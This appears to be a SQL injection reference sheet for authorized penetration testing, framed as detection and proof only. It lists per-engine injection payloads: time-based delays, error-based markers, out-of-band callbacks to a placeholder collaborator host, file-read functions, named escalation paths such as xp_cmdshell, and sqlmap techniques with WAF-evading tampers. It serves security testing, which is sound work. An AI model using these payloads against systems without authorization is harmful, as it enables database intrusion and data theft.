# DBMS Cheat Sheet (detection and proof only)

Class labels: **D** detect · **P** proof (one scalar) · **S** data (permission) · **X** server reach (permission). Payloads that execute commands, write files or create functions are listed by name only as escalation paths to describe in a report. They are not given as payloads and are never run.

Sources: PortSwigger SQL injection cheat sheet, pentestmonkey cheat sheets (MySQL, MSSQL, Oracle, Postgres, DB2, Informix, Ingres), PayloadsAllTheThings SQL Injection, OWASP WSTG 05.x, sqlmap `queries.xml` / `errors.xml`.

| | MySQL / MariaDB | PostgreSQL | MSSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| Comment | `-- -` `#` `/* */` | `--` `/* */` | `--` `/* */` | `--` `/* */` | `--` `/* */` |
| String concat | `'a' 'b'`, `CONCAT('a','b')` | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` | `'a'\|\|'b'` |
| Arithmetic proof | `40-1` | `40-1` | `40-1` | `40-1` | `40-1` |
| Version (P) | `@@version` | `version()` | `@@version` | `SELECT banner FROM v$version WHERE ROWNUM=1` | `sqlite_version()` |
| Current user (P) | `CURRENT_USER()` | `current_user` | `SYSTEM_USER` | `SELECT user FROM dual` | n/a |
| Database (P) | `DATABASE()` | `current_database()` | `DB_NAME()` | `SYS_CONTEXT('USERENV','DB_NAME')` | n/a |
| Privilege (P) | `@@secure_file_priv`; `super_priv` in `mysql.user` | `current_setting('is_superuser')` | `IS_SRVROLEMEMBER('sysadmin')` | `SELECT * FROM session_roles` (count only) | n/a |
| Time (D) | `(SELECT * FROM (SELECT(SLEEP(3)))x)` | `1=(SELECT 1 FROM PG_SLEEP(3))` | `; WAITFOR DELAY '0:0:3'` (stacked) | `DBMS_PIPE.RECEIVE_MESSAGE('x',3)` | `LIKE('ABC',UPPER(HEX(RANDOMBLOB(100000000/2))))` |
| Conditional error (D) | `IF(1=1,(SELECT 1 UNION SELECT 2),1)` | `CAST(1/(CASE WHEN 1=1 THEN 0 ELSE 1 END) AS INT)` | `1/(CASE WHEN 1=1 THEN 0 ELSE 1 END)` | `TO_CHAR(1/(CASE WHEN 1=1 THEN 0 ELSE 1 END)) FROM dual` | `CASE WHEN 1=1 THEN load_extension(1) END` (errors) |
| Visible error marker (D) | `EXTRACTVALUE(1,CONCAT(0x7e,'bbsq',7*7))` | `CAST('bbsq'\|\|7*7 AS INT)` | `CONVERT(INT,'bbsq'+CAST(7*7 AS VARCHAR))` | `CTXSYS.DRITHSX.SN(1,'bbsq'\|\|7*7)` | n/a |
| OOB (D/P) | `LOAD_FILE('\\\\COLLAB\\a')` (Windows, X) | `dblink_connect('host=COLLAB …')` | `EXEC master..xp_dirtree '\\COLLAB\a'` | `UTL_INADDR.GET_HOST_ADDRESS('COLLAB')`, `UTL_HTTP.REQUEST` | n/a |
| Metadata (S) | `information_schema.tables` | `information_schema.tables`, `pg_catalog` | `information_schema.tables`, `sys.objects` | `all_tables`, `all_tab_columns` | `sqlite_master` |
| File read (X) | `LOAD_FILE()` | `pg_read_file()`, `lo_import()` | `OPENROWSET(BULK …)` | `UTL_FILE`, `DBMS_LOB` | n/a |
| RCE path (report only) | `INTO OUTFILE` web shell, UDF | `COPY … FROM PROGRAM`, extensions | `xp_cmdshell`, `sp_OACreate`, CLR | Java stored procs, `DBMS_SCHEDULER` | `ATTACH DATABASE` file write, `load_extension` |
| Stacked queries | driver-dependent (rare) | usually yes | yes | no (except PL/SQL blocks) | driver-dependent |
| UNION quirk | — | types must match (`NULL` safest) | types must match | needs `FROM dual` | — |

## Other engines (SQ-46)

| Engine | Fingerprint | Notes |
|---|---|---|
| MS Access | errors `JET Database Engine`, `Microsoft Access Driver` | no comments, use `%00` or balanced; `IIF()`; `MSysObjects` (S); time via heavy cross joins |
| DB2 | `SELECT versionnumber FROM sysibm.sysversions`; `sysibm.sysdummy1` | concat `\|\|`; comments `--` |
| Informix | `DBINFO('version','full')`; `systables` | `FIRST n` instead of LIMIT |
| H2 / HSQLDB | `H2VERSION()`; errors `[42xxx-1xx]` | `CREATE ALIAS` / `CALL` = Java RCE path, report only |
| ClickHouse | `version()`; `DB::Exception` | `sleep(3)` capped at 3 s by the server |
| Sybase ASE | `@@version`; `Sybase message` | `WAITFOR DELAY` like MSSQL |
| CockroachDB | `version()` includes `CockroachDB` | PostgreSQL wire syntax, `pg_sleep` |

## sqlmap technique letters

`B` boolean · `E` error · `U` union · `S` stacked · `T` time · `Q` inline. Use `--technique=BT` for the least intrusive confirmation, add `E`/`U` only on read-only GET sinks. `--risk=3` adds OR-based payloads that can modify every row in UPDATE/DELETE statements. `sqlmap_safe.sh` refuses it unless `BB_SQLI_ALLOW_RISK3=1` is set.

Useful tampers: `space2comment`, `between`, `randomcase`, `charencode`, `chardoubleencode`, `charunicodeencode`, `versionedkeywords`, `modsecurityversioned`, `apostrophemask`, `equaltolike`, `greatest`, `space2mysqlblank`, `base64encode`.
